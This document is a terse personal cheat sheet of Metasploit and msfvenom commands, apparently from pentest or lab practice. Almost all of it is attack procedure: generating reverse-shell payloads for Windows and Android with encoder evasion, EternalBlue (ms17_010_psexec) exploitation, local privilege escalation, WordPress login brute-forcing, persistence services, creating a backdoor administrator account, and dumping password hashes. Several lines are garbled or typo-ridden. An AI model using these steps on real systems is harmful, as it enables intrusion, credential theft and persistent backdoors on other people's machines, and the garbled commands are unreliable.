auxiliary
--------------

search type: auxiliary name:smb
use scanner /smb/smb2
info
show options
services -p 445 --rhosts
run or exploit

---------------------------------------Meterpreter-----------------------------------------------------

setg RHOSTS 10.0.0.1 : global set option accross all modules
creds : to check credential after sucessful bruteforcing 

====================================================MSFVenom_with_netcat_reverse=================================

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

sudo nc -nvlp 53

=========================================: MSFvenom_with_meterpreter===========================================

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe 


Now lets move to msfconsole:
-----------------------------

use exploit/multi/handler 

show options
set payload windows/shell/reverse_tcp
set LHOST 10.10.15.135
set LPORT 1234
exploit

======================================================suggester===================================================
run post/multi/recon/local_exploit_suggester

Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation
3. In Metasploit (msf > prompt) type: use exploit/windows/local/ms16_014_wmi_recv_notif
4. In Metasploit (msf > prompt) type: set SESSION [meterpreter SESSION number]
5. In Metasploit (msf > prompt) type: set LPORT 5555
6. In Metasploit (msf > prompt) type: run


=============================================================msf_wordpress====================================



msf > use auxiliary/scanner/http/wordpress_login_enum

msf auxiliary(wordpress_login_enum) > set URI /wordpress/wp-login.php

URI => /wordpress/wp-login.php

msf auxiliary(wordpress_login_enum) > set PASS_FILE /tmp/passes.txt

PASS_FILE => /tmp/passes.txt

msf auxiliary(wordpress_login_enum) > set USER_FILE /tmp/users.txt

USER_FILE => /tmp/users.txt

msf auxiliary(wordpress_login_enum) > set RHOSTS 192.168.1.201

RHOSTS => 192.168.1.201

msf auxiliary(wordpress_login_enum) > run
------------------------------------------------------privesc-----------------------------------------------------
#privesc
run post/multi/recon/local_exploit_suggester
getprivs
ps
migrate -N PROCESS_NAME
load kiwi
hashdump
run post/windows/manage/enable_rdp
=============================================================msf_android=========================================

use exploit/android/fileformat
adobe_reader_pdf_js_interface
et payload android/meterpreter/reverse_tcp
set lhost 192.168.182.136 (your IP here)
set port 20068
exploit


B. Make an MSFpayload and inject it.
Payload can be created by following commands:
 msfvenom -p android/meterpreter/reverse_tcp
LHOST=186.57.28.44
LPORT=4895R
>/root/FILENAME.apk -p => Specify Payload
LHOST => Your IP* or DDNS
LPORT => Port You want to liste

------------------------------------------------------------------------------

Use Eternal Blue PSEXEC to compromise Server2016

use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/reverse_tcp
set rhosts 192.168.6.136
set lhost 192.168.6.128
set smbpass 1Password
set smbuser moo
show options
run

background
sessions

use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set session <session ID>
set lport 7777
exploit

# Make note of the resource file

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <Kali IP>
set lport 7777
run

# Reboot Server2016
# Log in as administrator
# Verify that the handler receives a connection
# At the meterpreter prompt type:
getuid

# When done, at meterpreter prompt> enter:

resource <full path to resource file>

# Make note of the name of the remaining artifact in C:\Temp
# Manually delete the final artifact in C:\Temp


---------------------------------------------pivoting---------------------------------------

set threads 3
run  (see if the scan identifies the OS-is one of them Server 2016?)

# Attempt an Eternal Blue PSEXEC buffer overflow attack against Server2016

search eternal
use <exploit/windows/smb/ms17_010_psexec>
show options
search payload windows/x64/meterpreter
set payload windows/x64/meterpreter/bind_tcp
set rhosts <server2016 IP>
set lhost <Kali IP>
set smbuser moo
set smbpass 1Password
show options
run

# Get information from Server2016

getuid

# Drop to a Windows command prompt (shell)

shell

# Create a backdoor administrator account

net user haxxor Letmein! /add
net localgroup administrators /add haxxor

# Return to meterpreter and dump Server2016 password hashes

sessions
sessions 2

search hashdump

use post/windows/gather/smart_hashdump
show options
set session 2
run

